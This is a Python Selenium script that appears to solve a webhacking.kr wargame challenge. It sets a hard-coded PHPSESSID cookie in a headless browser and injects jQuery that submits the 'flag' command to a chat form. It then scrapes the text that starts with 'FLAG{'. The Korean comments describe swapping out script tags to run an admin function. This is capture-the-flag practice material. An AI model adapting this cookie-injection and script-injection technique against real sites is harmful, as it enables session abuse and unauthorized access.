from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import time

URL = "http://webhacking.kr:10007"
URI = "/"
PHPSESSID = '5m4vrbnhn9upeegf1mv0t1ccmn'

COOKIES = {
    'name' : 'PHPSESSID', 'value' : PHPSESSID
}

"""
    풀이
    1. 기존 스크립트 태그 제거 후 admin을 실행할 수 있는 스크립트 태그 추가하는 기능 삽입
    2. flag 명령어 입력 및 화면 출력 결과 긁어오기
"""

try : 
    service = Service(executable_path="/chromedriver-linux64/chromedriver")
    options = webdriver.ChromeOptions()
    for _ in [
        "--headless",
        "--window-size=1920x1080",
        "--disable-gpu",
        "--no-sandbox",
        "--disable-dev-shm-usage",
        "--proxy-server=http://127.0.0.1:9090",
    ]:
        options.add_argument(_)

    driver = webdriver.Chrome(service=service, options=options)
    driver.implicitly_wait(3)
    driver.set_page_load_timeout(3)
    driver.get(URL + URI)  # 접속할 웹 페이지 URL
    driver.add_cookie(COOKIES)

    trigger_script = """
        $('#m').val('flag');
        $('form').submit();
    """

    time.sleep(2)

    driver.execute_script(trigger_script)

    time.sleep(2)

    # 메시지 결과 크롤링
    li_elements = driver.find_elements(By.CSS_SELECTOR, "#messages li")

    # "FLAG{" 로 시작하는 텍스트 출력
    for li in li_elements:
        text = li.text  # <li> 태그의 텍스트 내용
        if text.startswith("FLAG{"):
            with open('./FLAG.txt', mode="w") as f:
                f.write(text)

except Exception as e:
    driver.quit()
    print(e)
    exit()

# 브라우저 닫기
driver.quit()